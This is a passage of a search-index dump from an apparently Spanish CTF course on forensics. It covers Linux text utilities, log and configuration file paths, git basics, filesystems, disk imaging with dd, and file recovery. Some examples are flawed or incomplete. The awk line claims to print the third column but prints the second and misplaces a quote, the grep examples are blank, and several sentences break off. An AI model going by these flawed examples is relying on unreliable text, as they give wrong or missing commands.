ubicaciones de los logs de algunos sistemas y programas de común uso.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAnálisis forense para recuperar información eliminada\u003c/strong\u003e: En esta sección veremos técnicas y herramientas para recuperar archivos eliminados de un computador.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAnálisis forense en versionado de archivos\u003c/strong\u003e: Esta sección explicará de forma breve el funcionamiento de algunos sistemas de versionamiento de archivos, y revisaremos herramientas que nos permitirán recuperar datos borrados en versiones más recientes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAnálisis forense sobre protocolos de comunicación\u003c/strong\u003e: En esta sección se revisará la herramienta \u003ccode\u003eWireshark\u003c/code\u003e, la cual nos permite realizar análisis forense sobre logs de protocoles de comunicación conocidos. En específico, en este curso veremos protocolos de capa de red, transporte y aplicación del modelo de Internet y el protocolo USB.\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:25,href:"/docs/forense/cmd-logs/",title:"Comandos, Logs y Configuraciones",description:null,content:"\u003cp\u003eEn esta página veremos algunos comandos útiles para problemas de forense y enumeraremos algunas rutas comunes en las que se suelen almacenar logs y archivos de configuración de programas y servicios de común uso.\u003c/p\u003e\n\u003ch2 id=\"comandos-útiles-para-análisis-forense\"\u003eComandos útiles para análisis forense\u003c/h2\u003e\n\u003cp\u003eEstos comandos pueden ser útiles tanto en forensics como en otras preguntas de CTF. También les pueden servir en la vida, si trabajan con terminales de Linux.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003efind\u003c/code\u003e: Permite encontrar un archivo por su nombre, tipo, tamaño, etc.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEncontrar un archivo por nombre (\u003cem\u003ecase insensitive\u003c/em\u003e) en una carpeta o sus subcarpetas\u003c/strong\u003e: \u003ccode\u003efind -iname nombre\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEncontrar todos los archivos de extensión \u003ccode\u003emd\u003c/code\u003e en una carpeta o sus subcarpetas\u003c/strong\u003e: \u003ccode\u003efind -regex \u0026quot;.*\\.md\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEncontrar todos los archivos no vacíos en una carpeta o sus subcarpetas\u003c/strong\u003e: \u003ccode\u003efind -not -empty\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egrep\u003c/code\u003e: Permite encontrar un archivo por su contenido. Soporta expresiones regulares\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eBuscar una palabra en un archivo\u003c/strong\u003e:\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBuscar una palabra en una carpeta y sus subcarpetas\u003c/strong\u003e:\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBuscar una \u003ca href=\"https://regexr.com\"\u003eexpresión regular\u003c/a\u003e\u003c/strong\u003e:\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eawk\u003c/code\u003e: Pequeño pero potente lenguaje de programación que permite realizar operaciones sobre archivos de texto semi estructurados. Les recomiendo \u003ca href=\"http://www.hcs.harvard.edu/~dholland/computers/awk.html\"\u003eeste tutorial\u003c/a\u003e para aprender a utilizarlo.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMostrar solo la tercera columna de un archivo CSV\u003c/strong\u003e: \u003ccode\u003eawk -F\u0026quot;,\u0026quot; '{print $2} \u0026lt; archivo.csv'\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esed\u003c/code\u003e: Utilidad que facilita el reemplazar caracteres por otros en un archivo de texto.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eReemplazar en todo un archivo los números por \u003ccode\u003ex\u003c/code\u003e\u003c/strong\u003e: \u003ccode\u003eecho \u0026quot;1-hola 2-adios 9213-chao\u0026quot; | sed \u0026quot;s/[0-9]/x/g\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etr\u003c/code\u003e: Utilidad que facilita el \u003cem\u003etransponer\u003c/em\u003e (desplazarlos) o eliminar caracteres de un archivo de texto.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCifrar o descifrar un mensaje en ROT13\u003c/strong\u003e: \u003ccode\u003eecho \u0026quot;hola\u0026quot; | tr a-z n-za-m\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEliminar tildes de una cadena de texto\u003c/strong\u003e: \u003ccode\u003eecho \u0026quot;ácido gélido sísmico lógico único\u0026quot; | tr -d áéíóú\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReemplazar tildes de una cadena de texto por las vocales respectivas\u003c/strong\u003e: \u003ccode\u003eecho \u0026quot;ácido épico sísmico lógico único\u0026quot; | tr áéíóú aeiou\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esort\u003c/code\u003e: Comando útil para ordenar las líneas de un archivo alfabéticamente.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eOrdenar un archivo spearado por tabs según su segunda columna en orden reverso (parámetro numérico)\u003c/strong\u003e: \u003ccode\u003esort --key 2 --reverse --numeric-sort archivo.tsv\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003euniq\u003c/code\u003e: Programa que permite eliminar o aislar repetidos en archivo ordenado alfabéticamente.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEliminar líneas repetidas\u003c/strong\u003e: \u003ccode\u003euniq archivo.txt\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDejar líneas repetidas\u003c/strong\u003e: \u003ccode\u003euniq -d archivo.txt\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ePara entender mejor como usar cada utilidad, les recomendamos ejecutar \u003ccode\u003eman \u0026lt;nombre_comando\u0026gt;\u003c/code\u003e en sus computadores.\u003c/p\u003e\n\u003ch2 id=\"logs\"\u003eLogs\u003c/h2\u003e\n\u003cp\u003eUn archivo de \u003ccode\u003elog\u003c/code\u003e registra información importante relacionada a la ejecución de un proceso o sistema operativo.\u003c/p\u003e\n\u003cp\u003eLos archivos de log son interesantes en CTFs debido a que, dependiendo del nivel de verbosidad con el que estén configurados, podrían quedar guardados datos sensibles en ellos. (como IPs, contenido de consultas o incluso contraseñas).\u003c/p\u003e\n\u003cp\u003eA continuación haremos una lista breve de algunos logs importantes en sistemas operativos basados en Linux y servicios que suelen correrse sobre ellos.\u003c/p\u003e\n\u003ch3 id=\"logs-de-sistema\"\u003eLogs de sistema\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://man7.org/linux/man-pages/man1/journalctl.1.html\"\u003e\u003ccode\u003ejournalctl\u003c/code\u003e\u003c/a\u003e: Herramienta que permite revisar logs del \u003ccode\u003ejournal\u003c/code\u003e de los sistemas operativos basados en Linux con Systemd. Al ejecutarla sin argumentos, es posible ver los \u003ccode\u003elogs\u003c/code\u003e del sistema relacionados con el kernel, el booteo y los servicios administrados por \u003ccode\u003esystemd\u003c/code\u003e desde el más antiguo guardado.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAl usar la flag \u003ccode\u003e-r\u003c/code\u003e los logs se muestran en orden reverso (parte con los más recientes)\u003c/li\u003e\n\u003cli\u003eLa flag \u003ccode\u003e-f\u003c/code\u003e permite mantener en observación los logs, mostrando los nuevos mensajes apenas se emiten.\u003c/li\u003e\n\u003cli\u003eEs posible ver otras flags en el link de esta sección.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esyslog\u003c/code\u003e: Algunos servicios guardan sus logs en un archivo denominado \u003ccode\u003esyslog\u003c/code\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEn Ubuntu este archivo está en \u003ccode\u003e/var/log/syslog\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eEn OSes basados en CentOS, se guarda en \u003ccode\u003e/var/log/messages\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"logs-de-aplicaciones\"\u003eLogs de aplicaciones\u003c/h3\u003e\n\u003cp\u003eLa carpeta \u003ccode\u003e/var/log/\u003c/code\u003e suele contener logs de los servicios instalados en un sistema operativo basado en Linux. Algunas aplicaciones interesantes para revisar sus logs:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eServidores Web\u003c/strong\u003e: Servicios que se encargan de contestar las consultas realizadas por un navegador web (o cualquier programa que \u0026ldquo;hable\u0026rdquo; HTTP/HTTPS). Generalmente escuchan en los puertos 80 y 443. Algunos servidores web comunes:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eApache\u003c/strong\u003e: Este servidor guarda dos tipos de logs:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLogs de Acceso\u003c/strong\u003e: Se almacenan las IP de los clientes y las rutas accedidas por ellos. Puede estar guardado en alguna de las siguientes rutas, aunque podría variar entre distribuciones y configuraciones:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/var/log/httpd/access_log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/var/log/apache2/access.log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/var/log/httpd-access.log\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLogs de Error\u003c/strong\u003e: Suelen ser específicos para cada \u003cem\u003evirtual host\u003c/em\u003e del servidor.  La mejor forma de hallar su ubicación es revisando el archivo de configuración de Apache el string \u003ccode\u003eErrorLog\u003c/code\u003e. (¿Cómo encontrarían el archivo de configuración de apache si solo saben que está en la carpeta \u003ccode\u003e/etc/\u003c/code\u003e?)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNGINX\u003c/strong\u003e: Al igual que Apache, separa sus logs según tipo. La siguiente es una ubicación posible, pero les recomendamos :\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLogs de Acceso\u003c/strong\u003e: \u003ccode\u003e/var/log/nginx/access.log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLogs de Error\u003c/strong\u003e: \u003ccode\u003e/var/log/nginx/error_log\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eServidor SSH e inicio de sesión\u003c/strong\u003e: El acto de iniciar sesión exitosa o fallidamente suele quedar registrado en el sistema. A continuación se detallan los comandos necesarios para revisar estos registros.\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLogs de inicio de sesión exitosos\u003c/strong\u003e \u003ccode\u003elast\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eInicios de sesión fallidos\u003c/strong\u003e \u003ccode\u003elast -b /var/log/btmp\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"archivos-de-configuración\"\u003eArchivos de configuración\u003c/h2\u003e\n\u003cp\u003eLos archivos de configuración de las aplicaciones de Linux suelen estar en la carpeta \u003ccode\u003e/etc/\u003c/code\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eApache\u003c/strong\u003e: \u003ccode\u003e/etc/apache2\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNGINX\u003c/strong\u003e: \u003ccode\u003e/etc/nginx\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSSH Daemon\u003c/strong\u003e: \u003ccode\u003e/etc/ssh\u003c/code\u003e\nA continuación mencionamos algunos archivos de configuración de sistema interesantes:\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUsuarios\u003c/strong\u003e: El archivo \u003ccode\u003e/etc/passwd\u003c/code\u003e posee una lista de todos los usuarios del sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGrupos\u003c/strong\u003e: El archivo \u003ccode\u003e/etc/group\u003c/code\u003e posee una lista de todos los grupos de usuario del sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSudoers\u003c/strong\u003e: El archivo \u003ccode\u003e/etc/sudoers\u003c/code\u003e y los archivos en \u003ccode\u003e/etc/sudoers.d/\u003c/code\u003e definen los usuarios con permisos para utilizar el comando \u003ccode\u003esudo\u003c/code\u003e, que permite ejecutar acciones como superusuario.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:26,href:"/docs/forense/versionado-recuperacion/",title:"Versionado y Recuperación de Archivos",description:null,content:"\u003cp\u003eEsta página tratará de dos enfoques distintos para recuperar información. El primero corresponde al uso de sistemas de control de versiones, mientras que el segundo desc\u003c/p\u003e\n\u003ch2 id=\"sistemas-de-control-de-versión\"\u003eSistemas de Control de Versión\u003c/h2\u003e\n\u003cp\u003eAl desarrollar aplicaciones, se suelen utilizar \u003cstrong\u003esistemas de control de versión\u003c/strong\u003e, tanto para administrar las colaboraciones de múltiples personas o equipos, como para llevar un historial en el tiempo de los cambios realizados en el código. Esto último es bastante beneficioso en casos en los que es necesario revertir algún cambio, pero puede llevar a la persistencia de la difusión accidental de valores confidenciales.\u003c/p\u003e\n\u003cp\u003eA modo de ejemplo, en el curso veremos herramientas para revisar el sistema de control de versión \u003cem\u003egit\u003c/em\u003e. Sin embargo, muchas de estas técnicas podrían aplicar de igual manera en otros sistemas, como \u003cem\u003eMercurial\u003c/em\u003e, \u003cem\u003eSVN\u003c/em\u003e, \u003cem\u003ePijul\u003c/em\u003e, etc.\\\u003c/p\u003e\n\u003ch3 id=\"git\"\u003eGit\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://git-scm.com/\"\u003eGit\u003c/a\u003e es un sistema de control de archivos distribuido creado por Linus Torvalds el año 2005, para utilizarlo en el desarrollo del Kernel de Linux en reemplazo a una herramienta llamada \u003ccode\u003eBitKeeper\u003c/code\u003e. Hoy es una de las herramientas más populares para el control de versiones de código.\u003c/p\u003e\n\u003ch4 id=\"funcionamiento-de-git\"\u003eFuncionamiento de Git\u003c/h4\u003e\n\u003cp\u003eGit almacena información del versionamiento en dos estructuras distintas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUn \u003cstrong\u003eíndice mutable\u003c/strong\u003e que almacena el estado actual del versionamiento.\u003c/li\u003e\n\u003cli\u003eUn \u003cem\u003estorage\u003c/em\u003e de \u003cstrong\u003eobjetos inmutables\u003c/strong\u003e que guarda todas las versiones almacenadas de los archivos del repositorio.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eAdemás, define los siguientes conceptos para manejar el versionamiento:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eBlob\u003c/code\u003e representa una versión completa de un archivo, guardada en el \u003cem\u003estorage\u003c/em\u003e inmutable.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCommit\u003c/code\u003e es un conjunto de blobs y representa un estado en el repositorio, identificado por un \u003cem\u003ehash SHA-1\u003c/em\u003e. Un commit puede tener uno o más \u003cem\u003epadres\u003c/em\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eBranch\u003c/code\u003e o \u003ccode\u003erama\u003c/code\u003e es un puntero a un conjunto de \u003cem\u003ecommits\u003c/em\u003e representado por el último commit de la rama. A medida se agregan commits en una rama, el puntero se va moviendo de forma automática. Lo anterior genera una estructura similar a un \u003ccode\u003eárbol\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eRemote\u003c/code\u003e representa una versión del mismo repositorio en una máquina remota. Es posible enviar los cambios locales a esa versión (\u003ccode\u003epush\u003c/code\u003e) o traerse cambios remotos de esa versión (\u003ccode\u003epull\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eStaging\u003c/code\u003e es donde se almacenan los archivos que desean ser agregados al próximo commit.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emaster\u003c/code\u003e o \u003ccode\u003emain\u003c/code\u003e es el nombre del puntero al último commit de la rama principal.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etag\u003c/code\u003e es una referencia fija a algún commit en especial. Son útiles para marcar en el arbol\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eHEAD\u003c/code\u003e es un puntero al último commit de la rama actual.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"comandos-útiles-en-git\"\u003eComandos útiles en Git\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInicializar Repositorio\u003c/strong\u003e: \u003ccode\u003egit init\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eClonar Repositorio\u003c/strong\u003e: \u003ccode\u003egit clone \u0026lt;url\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRevisar el historial de cambios\u003c/strong\u003e: \u003ccode\u003egit log\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCambiar el estado al commit padre\u003c/strong\u003e: \u003ccode\u003egit checkout HEAD^\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDeshacer cambios (y perderlos)\u003c/strong\u003e: \u003ccode\u003egit reset --hard\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAgregar carpeta \u003ccode\u003ea\u003c/code\u003e y su contenido a \u003ccode\u003estaging\u003c/code\u003e\u003c/strong\u003e: \u003ccode\u003egit add a\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCrear un \u003ccode\u003ecommit\u003c/code\u003e con los cambios en \u003ccode\u003estaging\u003c/code\u003e y el mensaje \u003ccode\u003ecommit message\u003c/code\u003e\u003c/strong\u003e: \u003ccode\u003egit commit -m \u0026quot;commit message\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"explorar-historial-de-cambios\"\u003eExplorar historial de cambios\u003c/h4\u003e\n\u003cp\u003eLa forma más fácil de hacerlo es con un programa de interfaz gráfica, como por ejemplo, \u003ccode\u003egitk\u003c/code\u003e. En clases veremos cómo usar este programa.\u003c/p\u003e\n\u003ch2 id=\"almacenamiento-en-linux\"\u003eAlmacenamiento en Linux\u003c/h2\u003e\n\u003cp\u003eEn esta parte del apunte hablaremos un poco acerca del manejo de dispositivos de almacenamiento en Linux. También mostraremos algunos comandos para ejecutar tareas básicas para crear, listar y borrar particiones.\u003c/p\u003e\n\u003ch3 id=\"conceptos-generales\"\u003eConceptos Generales\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDispositivo de Almacenamiento Secundario\u003c/strong\u003e: Cualquier dispositivo que permita almacenar información de forma persistente. Algunos ejemplos de este tipo de dispositivos son los discos duros, las unidades de estado sólido (SSD), las tarjetas flash (SD, MMC, cartuchos de videojuegos), diskettes, CDs (no permiten reescritura), DVDs, etc.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTabla de Particiones\u003c/strong\u003e: Un dispositivo de almacenamiento secundario puede dividirse en una o más unidades lógicas de almacenamiento, las cuales se conocen como particiones. La cantidad de particiones y su ubicación en el espacio físico de almacenamiento se definen en la \u003cstrong\u003etabla de particiones\u003c/strong\u003e. Las siguientes son tipos de tablas de particiones comunes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMBR\u003c/strong\u003e: (Master boot record) Tabla de particiones usada en versiones antiguas de Windows y Linux. Tenía varias limitaciones, como tamaño máximo de particiones y cantidad de particiones por disco.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGPT\u003c/strong\u003e: (GUID Partition Table) Tabla de particiones usada en computadores modernos con Windows y Linux. Es más\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSistemas de Archivos\u003c/strong\u003e: Guardar información en un dispositivo de almacenamiento no es una tarea directa. En general, aparte de la información a guardar, uno desea guardar metainformación extra asociada a cada archivo, como nombre, fecha de creación o modificación, propietario, permisos, ubicación, etc. Al mismo tiempo, uno podría querer que el mismo dispositivo se encargue de algunas tareas comunes, como llevar respaldo de los archivos a medida se modifican u optimizar el uso de espacio en casos en que hay mucha información redundante. Este tipo de funcionalidades se pueden definir a nivel del sistema de archivos asociado a la partición. Algunos sistemas de archivos conocidos son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eFAT, FAT12, FAT16, FAT32 y exFAT\u003c/strong\u003e:  File Allocation Table es un sistema de archivos creado a fines de los años 70. Cada versión mencionada se diferencia en el tamaño máximo de los archivos que puede almacenar y del tamaño máximo de la partición. FAT32 soporta volúmenes de hasta 2 TeraBytes, mientras que exFAT soporta hasta 128 PetaBytes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNTFS\u003c/strong\u003e: Sistema de Archivos propietario de Microsoft y usado principalmente en la familia de sistemas operativos Windows NT. Soporta una mayor cantidad de metadatos, el uso de listas de control de acceso y el uso de \u003ca href=\"https://en.wikipedia.org/wiki/Journaling_file_system\"\u003eJournaling\u003c/a\u003e para evitar errores de escritura.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eext2, ext3 y ext4\u003c/strong\u003e: Sistemas de archivos usados en Linux principalmente. ext3 y ext4 se caracterizan por ser  \u003cem\u003ejournaled\u003c/em\u003e. Las versiones más nuevas soportan además volúmenes más grandes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eZFS\u003c/strong\u003e: Sistema de archivos con hartas características que lo hacen ideal para el manejo de respaldos o grandes volúmenes de datos.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBTRFS\u003c/strong\u003e: Sistema de archivos con capacidades de integridad y respaldo de archivos.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHFS, HFS+ y APFS\u003c/strong\u003e:  Sistemas de archivos usados principalmente en sistemas operativos OSX/macOS. HFS+ y APFS son \u003cem\u003ejournaled\u003c/em\u003e. APFS posee funcionalidades de respaldos, cifrado, optimizaciones para SSDs y revisión de integridad de archivos como parte de las funcionalidades básicas del sistema de archivos.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMontar/Desmontar un sistema de archivos\u003c/strong\u003e: Para utilizar un sistema de archivos en Linux, es necesario montarlo en una carpeta del sistema. Luego de hacerlo, los archivos del sistema de archivos se verán en esa carpeta.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eBlock Devices\u003c/em\u003e\u003c/strong\u003e: En Linux, varios dispositivos se comportan como si fueran archivos en el sistema. En el caso de los dispositivos de almacenamiento, estos se suelen mostrar como dos tipos de archivos. En la práctica, los \u003cem\u003eBlock Devices\u003c/em\u003e permiten leer y escribir directamente de o en los dispositivos de almacenamiento. Por ejemplo, si quisiera copiar un disco completo identificado en el sistema como el archivo \u003ccode\u003e/dev/sda\u003c/code\u003e, basta con \u003cem\u003ecopiar\u003c/em\u003e esa ruta por completo (con un comando especial). Lo mismo si quisiera cargar un respaldo en un disco (debo \u003cem\u003eescribir\u003c/em\u003e en ese archivo la imagen de respaldo).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDispositivos loop\u003c/strong\u003e: Son seudo dispositivos de almacenamiento, los cuales permiten hacer que un archivo común y corriente actúe como un dispositivo de bloques. Si se montan con un comando especial, aparecerán como dispositivos de bloque.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"herramientas-útiles\"\u003eHerramientas útiles\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003elsblk\u003c/code\u003e: Muestra todos los dispositivos de almacenamiento de bloque en el sistema.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egparted\u003c/code\u003e: Permite crear particiones con una interfaz gráfica muy simple de usar.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egnome-disks\u003c/code\u003e: Permite revisar dispositivos de almacenamiento conectados, crear imágenes de ellos y montar imágenes virtuales. También tiene funcionalidades limitadas para formatear y crear particiones y tablas de particiones.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edd\u003c/code\u003e: Permite copiar a bajo nivel información de sistemas de archivos en respaldos u otros sistemas de archivos. Debido a que trabaja en muy bajo nivel (byte a byte en el dispositivo), su mal uso puede ser muy peligroso.\n\u003cul\u003e\n\u003cli\u003eEj: \u003ccode\u003edd if=/dev/sda of=backup.img status=progress\u003c/code\u003e: Copia el dispositivo de bloque \u003ccode\u003e/dev/sda\u003c/code\u003e al archivo backup.img\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003elosetup\u003c/code\u003e: Permite configurar \u003cem\u003eloop devices\u003c/em\u003e:\n\u003cul\u003e\n\u003cli\u003eEj: \u003ccode\u003esudo losetup /dev/loop0 backup.img\u003c/code\u003e transforma la imagen en un dispositivo \u003cem\u003eloop\u003c/em\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emount\u003c/code\u003e: Permite montar un sistema de archivos en una carpeta.\n\u003cul\u003e\n\u003cli\u003eEj: \u003ccode\u003esudo mount /dev/sda /mnt\u003c/code\u003e Monta el dispositivo de bloque \u003ccode\u003e/dev/sda\u003c/code\u003e en la carpeta \u003ccode\u003e/mnt\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eumount\u003c/code\u003e: Permite desmontar una carpeta a la que previamente se le montó un sistema de archivos.\n\u003cul\u003e\n\u003cli\u003eEj: \u003ccode\u003esudo umount /dev/sda\u003c/code\u003e desmonta el dispositivo de bloque \u003ccode\u003e/dev/sda\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eEj2: \u003ccode\u003esudo umount /mnt\u003c/code\u003e desmonta el dispositivo de bloque que se montó previamente en \u003ccode\u003e/mnt\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"recuperación-de-archivos\"\u003eRecuperación de archivos\u003c/h2\u003e\n\u003cp\u003eEn problemas de forense, puede que sea necesario tratar con soportes de almacenamiento dañados o con archivos borrados. A continuación se nombran algunos de estos problemas posibles y qué programas podemos usar para resolverlos.\u003c/p\u003e\n\u003ch3 id=\"problemas-recurrentes\"\u003eProblemas recurrentes\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRecuperación de Archivos dañados\u003c/strong\u003e: Es posible que contemos con uno o más archivos dañados, y queramos repararlos para acceder de forma parcial o total a su contenido. Para lo anterior, sería necesario un programa especializado para el tipo de archivo, que aproveche algunas de las propiedades del formato para recuperar la información. Cabe destacar que no todos los tipos de archivos son reparables o recuperables con estos métodos, y en general es muy probable que parte de la información se corrompa.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRecuperación de Archivos Eliminados\u003c/strong\u003e: Cuando se elimina un archivo de un soporte de almacenamiento, en general no se borra, sino que se elimina de un \u003cem\u003eíndice\u003c/em\u003e del mismo soporte. Si escaneáramos byte a byte el soporte de almacenamiento, existe la posibilidad de recuperar el archivo de forma total o parcial, siempre y cuando ese espacio de memoria no haya sido sobreescrito por otro archivo.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUso de Archivos Temporales para recuperar información\u003c/strong\u003e: Algunos programas de edición de archivos guardan versiones temporales de estos en carpetas especiales. En algunos casos es posible recuperar el contenido de un documento importante a partir de los archivos temporales.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReparación de componentes físicas del dispositivo de almacenamiento\u003c/strong\u003e: En casos más complejos, es posible que el soporte de almacenamiento se encuentre dañado físicamente. El daño podría ser bajo, como por ejemplo, sectores del disco duro ilegibles. Sin embargo, también podría extenderse de tal forma que el dispositivo no es reconocible por el sistema operativo. En el primer caso, muchas veces es posible reparar el sistema de archivos de forma manual. En el segundo caso, puede ser necesario incluso contratar servicios de recuperación de datos especializados.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReparación de sistemas de archivos\u003c/strong\u003e: A veces el daño no ocurre a nivel de hardware, sino que está relacionado con los datos almacenados en el soporte que identifican el contenido dentro del dispositivo. Por ejemplo, podría dañarse el índice del disco o su tabla de particiones, para lo cual se requeriría regenerarla o repararla para poder acceder a su 